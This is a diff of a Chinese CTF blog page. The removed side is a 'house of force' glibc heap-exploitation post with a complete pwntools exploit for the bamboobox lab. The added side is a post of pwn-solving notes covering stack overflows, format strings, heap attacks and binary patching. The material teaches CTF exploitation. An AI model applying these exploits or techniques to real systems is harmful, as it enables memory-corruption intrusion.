@@ -5,14 +5,15 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>house of force初探 - V1ct0r的博客</title>
+    <title>做pwn题的心得 - V1ct0r的博客</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="house of force介绍：通俗的讲就是通过修改topchunk的size字节来控制malloc的返回地址，从而达到修改任意地址内容的目的：
-具体原理分析：
-因为从topchunk的切割是这样,"> 
+    <meta name="description" content="一、做栈题的心得：1、看栈的大小
+2、判断栈溢出的字节数(够的话直接栈上操作再跳回main函数再次操作，不够的话，栈迁移到bss上)
+命令：cyclic n  cyclic -l 报错(4位)
+3、,"> 
     <meta name="author" content="V1ct0r"> 
     <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -59,7 +60,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">house of force初探</h3>
+        <h3 class="subtitle">做pwn题的心得</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -94,20 +95,20 @@
                 
                 January 03, 2020
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/house-of-force%E5%88%9D%E6%8E%A2/" title="house of force初探" class="">house of force初探</a>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/%E5%81%9A%E5%A0%86%E9%A2%98%E7%9A%84%E5%BF%83%E5%BE%97/" title="做pwn题的心得" class="">做pwn题的心得</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    12k
+                    4.2k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    11 mins.
+                    4 mins.
                 </span>
                 
                 
@@ -120,7 +121,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/house%E5%AE%B6%E6%97%8F/" rel="tag">house家族</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a></li></ul>
             
         </div>
     </div>
@@ -141,28 +142,70 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h4 id="house-of-force介绍："><a href="#house-of-force介绍：" class="headerlink" title="house of force介绍："></a>house of force介绍：</h4><p>通俗的讲就是通过修改topchunk的size字节来控制malloc的返回地址，从而达到修改任意地址内容的目的：</p>
-<p>具体原理分析：</p>
-<p>因为从topchunk的切割是这样的：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = av-&gt;top;</span><br><span class="line"><span class="built_in">size</span> = chunksize (p);</span><br><span class="line"><span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">    remainder = chunk_at_offset (p, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    check_malloced_chunk (av, p, nb);</span><br><span class="line">    <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<a id="more"></a>
-
-<p>这里很容易理解： </p>
-<h5 id="new-topchunk-size-addr-topchunk-size-addr-malloc-size"><a href="#new-topchunk-size-addr-topchunk-size-addr-malloc-size" class="headerlink" title="new_topchunk_size_addr = topchunk_size_addr + malloc_size"></a>new_topchunk_size_addr = topchunk_size_addr + malloc_size</h5><h5 id="new-topchunk-size-topchunk-size-malloc-size"><a href="#new-topchunk-size-topchunk-size-malloc-size" class="headerlink" title="new_topchunk_size = topchunk_size - malloc_size"></a>new_topchunk_size = topchunk_size - malloc_size</h5><p>攻击原理介绍：</p>
-<p>1、chunk1和topchunk_size_addr物理相邻，如果存在堆溢出漏洞，导致chunk1可以修改内容从而溢出到topchunk_size_addr那么就可以修改top_chunk_size的大小。</p>
-<p>2、改写top_chunk_size为一个负数（32位是0xffffffff，64位是0xffffffffffffffff）</p>
-<p>3、现在就可以通过malloc（负数）来构造出evil chunk了，evil chunk。</p>
-<h5 id="4、evil-chunk的大小要怎么确定呢？也就是那个负数。"><a href="#4、evil-chunk的大小要怎么确定呢？也就是那个负数。" class="headerlink" title="4、evil chunk的大小要怎么确定呢？也就是那个负数。"></a>4、evil chunk的大小要怎么确定呢？也就是那个负数。</h5><h5 id="evil-chunk的大小：用目标地址减去-top-chunk-size-地址，再减去-chunk-头的大小-32位是0x8，64位是0x10-。"><a href="#evil-chunk的大小：用目标地址减去-top-chunk-size-地址，再减去-chunk-头的大小-32位是0x8，64位是0x10-。" class="headerlink" title="evil chunk的大小：用目标地址减去 top chunk_size 地址，再减去 chunk 头的大小(32位是0x8，64位是0x10)。"></a>evil chunk的大小：用目标地址减去 top chunk_size 地址，再减去 chunk 头的大小(32位是0x8，64位是0x10)。</h5><h5 id="64位为例子，假设要控制的地址是0x1af500，topchunk-size-addr是0x1af590"><a href="#64位为例子，假设要控制的地址是0x1af500，topchunk-size-addr是0x1af590" class="headerlink" title="64位为例子，假设要控制的地址是0x1af500，topchunk_size_addr是0x1af590"></a>64位为例子，假设要控制的地址是0x1af500，topchunk_size_addr是0x1af590</h5><h5 id="evil-chunk-size-0x1af500-0x1af590-0x10-0xA0-160-这个是我们要malloc的大小"><a href="#evil-chunk-size-0x1af500-0x1af590-0x10-0xA0-160-这个是我们要malloc的大小" class="headerlink" title="evil_chunk_size = 0x1af500 - 0x1af590 - 0x10 = -0xA0 = -160,这个是我们要malloc的大小"></a>evil_chunk_size = 0x1af500 - 0x1af590 - 0x10 = -0xA0 = -160,这个是我们要malloc的大小</h5><p>接着是运用公式了：</p>
-<p>new_topchunk_size_addr = 0x1af590 + (-0xA0+0x10) = 0x1af500</p>
-<p>new_topchunk_size = 0xffffffffffffffff - (-0xA0 + 0x10) = 0x8F（整数溢出漏洞），由于会有一些页对齐操作，真正在gdb中看到的大小是0x88</p>
-<p>这样就解释了构造evil_chunk可以使得top_chunk往堆的低地址移动，且大小发生变化</p>
-<p>5、再次malloc(size)时就会在新的topchunk的位置处切割出size的堆块并且写入内容，从而实现了任意地址写~</p>
-<p>exp如下：</p>
-<p>这里直接拿一道题看看：</p>
-<h4 id="LAB11的那个bamboobox"><a href="#LAB11的那个bamboobox" class="headerlink" title="LAB11的那个bamboobox"></a>LAB11的那个bamboobox</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the name of item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sd(str(index))</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the new name of the item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"></span><br><span class="line">bk(<span class="number">0x0000000000400ADD</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">py1 = <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,py1)</span><br><span class="line">malloc(<span class="number">-160</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">0x20</span>, p64(magic)*<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里形象地讲就是evil chunk上了top chunk的身体迫使他往前走<del>（house of force</del>）</p>
+            <h3 id="一、做栈题的心得："><a href="#一、做栈题的心得：" class="headerlink" title="一、做栈题的心得："></a>一、做栈题的心得：</h3><p>1、看栈的大小</p>
+<p>2、判断栈溢出的字节数(够的话直接栈上操作再跳回main函数再次操作，不够的话，栈迁移到bss上)</p>
+<p>命令：cyclic n  cyclic -l 报错(4位)</p>
+<p>3、如果开了canary，先泄露出canary(覆盖低字节或者格式化字符串泄露)，记得函数调用完要回填canary</p>
+<p>4、如果开了pie，先利用write或者puts函数(覆盖0截断)或者格式化字符串泄露基地址</p>
+<p>5、NX开了的话，一般不管，没开的话直接填shellcode，可以手写也可以工具直接生成</p>
+<p>6、一般的题目都是先栈溢出泄露出真实地址，再次回跳main最后填system去getshell</p>
+<h3 id="二、做格式化字符串题的心得：-一定是写指针！！！"><a href="#二、做格式化字符串题的心得：-一定是写指针！！！" class="headerlink" title="二、做格式化字符串题的心得：(一定是写指针！！！)"></a>二、做格式化字符串题的心得：(一定是写指针！！！)</h3><p>1、判断漏洞点格式化字符串</p>
+<p>2、判断能写的字符数限制，看下能不能同时泄露出canary和真实地址和基地址(%n$p，n就是写入开始的地方，用int(,16)去接收)</p>
+<p>3、写地址(要么用工具直接写，记得加pause，要么手写，”%128c”+”%12$hhn”)</p>
+<p>4、如果got表能改，一般直接填got表到栈中，再改写got表</p>
+<p>5、如果got不可改，则需要泄露出栈地址，然后通过计算栈的偏移，来得到ret的地址，将ret填到栈中，分2步填写，然后改写ret中的libc_start_main函数为onegadget，或者直接改写为rop链子</p>
+<p>6、如果是bss上的格式化字符串漏洞，就先找出栈上的有3个栈地址的2个值，然后改写第三个值为ret地址，另外一个改写为ret+2，接着改写倒数第二个地址，就可以实现改写ret上的libc_start_main了，或者改第三个为got地址，接着改第二个为onegadget，相当于间接改got表。</p>
+<p>7、堆的操作，如果可改写got表，改free真实地址为printf_plt，然后在堆上写格式化字符串，就可以实现这个漏洞了</p>
+<h3 id="三、做堆题的心得："><a href="#三、做堆题的心得：" class="headerlink" title="三、做堆题的心得："></a>三、做堆题的心得：</h3><p>一、边分析边写函数，把malloc、free、edit、puts等写出来（看到漏洞了，在旁边标明出来）</p>
+<p>二、分析堆块结构，写出结构体</p>
+<p>1、UAF漏洞是指指针的内容没有清空：</p>
+<p>free(0x600280)</p>
+<p>如果加上</p>
+<p>*(0x600280)=0</p>
+<p>这样就没有UAF漏洞了</p>
+<p>如果有UAF漏洞，一般这么用：</p>
+<p>1、申请unsorted_bin大小的chunk再free，泄露出libc地址，适用于double free。</p>
+<p>2、当堆块上有某个地址时，通过UAF申请同样大小的chunk，（注意申请和释放的顺序）写内容时覆盖那个地址为got表或者其他地址，再调用，即可实现执行。</p>
+<p>也可以用来实现unlink的操作，2个unsortedbin的free，接着再申请大于这两个堆块的bin，就可以编辑unlink了</p>
+<p>四、Double free，指针未清空，头部检查而已：</p>
+<p>free(0x600280)</p>
+<p>0x600280 = 0</p>
+<p>表示bss指针清空，那么就表示没有double free</p>
+<p>2、double free的题目有个固定的套路，构造fake_chunk，第四次申请时改malloc_hook（可能可以用onegadget和realloc实现）</p>
+<p>double free还用于没有edit函数时，申请出一个只要size头满足条件的chunk块即可(house of spirit)，可以是bss上的，也可以是栈上的</p>
+<p>double free 还可以用于改写堆的末尾使其指向有0x7f的地址，这种用于构造IO_file的攻击泄露地址</p>
+<p>或者double free由修改bss上的堆块的末尾造成！</p>
+<p>这里还有个叫做双链攻击(没有0x7f大小的情况下，但是有真实地址)，一个搞size头，另一个申请出来，改写topchunk到malloc_hook前面，前提是有真实地址</p>
+<p>3、offbyone</p>
+<p>这种题目一般观察输入中的for循环有没有在末尾多了一个字节的操作，或者判断中有小于等于，导致最后一个字节有溢出现象，溢出一个字节</p>
+<p>利用的话，最常见的就要数overlap chunk了，比如有12345堆块，这种做法是通过改写3号块造成溢出一个字节，改写4号块的状态变为free状态，然后presize写好前面3个堆块的大小，再free掉1号块，再free掉4号块实现。接着就是切割unsortedbin了，可以一样大小的，这样就可以实现我们的double free，只要堆块构造合理即可(2,3可以是0x7f大小，1号必须是unsortedbin，4号也是unsortedbin，也就是一定要大于0x80)，还可以是1234，改写1号堆块，将2号堆块的size改大，同时在3号块中伪造好nextsize，这样free掉2号堆块时，就可以实现得到unsorted bin大小的堆块，再次申请就是切割的问题了，也可以触发double free(申请到同一个堆块3)，这种技巧叫做extend the chunk，当然还有种叫做shrink the chunk，效果相同(当无法控制我们的presize时)</p>
+<p>4、offbynull</p>
+<p>这种漏洞，一般都是overlap the chunk，申请固定大小的0xf8，得到0x101,利用offbynull实现overlap the chunk，相当于有UAF 和 double free(可以攻击global max fast)</p>
+<p>offbynull或者offbyone还可以用来触发unlink(没有开pie的情况下，got表可改)。任意长度堆溢出也可以用来实现unlink的操作。</p>
+<p>5、unlink：</p>
+<p>1、fake_chunk的构造，一般是edit时堆溢出修改下一个chunk块的presize和size，ptr一定是合并后的大块的地址</p>
+<p>接着就是写got表，改got表泄露地址，实现onegadget(一般是free_hook的地址)，前提有堆溢出</p>
+<p>2、申请2个unsorted_bin大小的chunk，再申请大于这两个块的chunk2，会得到原来的2个chunk，那么通过修改大块的内容，从而伪造fake_chunk，实现unlink，前提是有UAF漏洞(got可改，pie没开)</p>
+<p>3、堆块大小固定，可以打印出堆块地址时，堆块错位的方法实现伪造unsorted_bin大小的堆块，unlink就可打印出libc的地址，然后一把操作。</p>
+<p>还有一种，开了pie，但是可以泄露出堆地址的unlink，填合并的自己的地址，这样会free掉大块，再次申请得到同样堆块，可以实现double free和UAF</p>
+<p>4、无符号数比较时，整数溢出0x80000000，造成堆溢出</p>
+<p>house of force(倒着切割堆块，前提能输入负数)</p>
+<p>house of orange(前提能改到topchunk的size，改小，再malloc一个大于topchunk的size的堆块)(用于没有free的情况下，或者没有unsorted bin的情况下)</p>
+<p>house of storm(一个大于0x400的堆块在unsortedbin中，一个在largebin中)，把unsorted bin的largebin插入到倒数第二个，实现攻击，一般会禁用fastbin</p>
+<p>unsorted bin的attack，攻击bk指针(主要bk指针连着，就不会断)，bk换成想要改写的地址-0x10，就可以改写为0x7f的main_arena，一般是攻击global_max_fast，这样就是fastbin的天下了</p>
+<p>house of romain，硬核爆破</p>
+<p>house of Lore smallbin的attack，伪造出一个fd和bk链，使得能够被申请出来</p>
+<p>tcache，有double free不会报错，不检查size头，7个填满为止</p>
+<p>条件竞争：多线程时，可以sleep一下</p>
+<p>沙箱，先看下有没有，禁用了什么函数(可以调用mprotect函数，开辟出空间，再open，read，write去打印出flag)</p>
+<p>free、malloc、edit函数看洞</p>
+<p>打patch技巧：</p>
+<p>1、栈要么改read的size，要么改leave ret 为ret ret</p>
+<p>2、格式化字符串，改printf为puts函数</p>
+<p>3、UAF漏洞，加个0，offbynull或者one的话，直接删掉</p>
+<p>4、溢出的话，改size即可</p>
+<p>5、条件竞争，nop掉sleep</p>
+<p>6、实在没招式了，删free函数</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -217,6 +260,13 @@
             </div>
             
             
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、做栈题的心得："><span class="toc-number">1.</span> <span class="toc-text">一、做栈题的心得：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、做格式化字符串题的心得：-一定是写指针！！！"><span class="toc-number">2.</span> <span class="toc-text">二、做格式化字符串题的心得：(一定是写指针！！！)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、做堆题的心得："><span class="toc-number">3.</span> <span class="toc-text">三、做堆题的心得：</span></a></li></ol>
+                </div>
+            </div>
             
             
         </div>
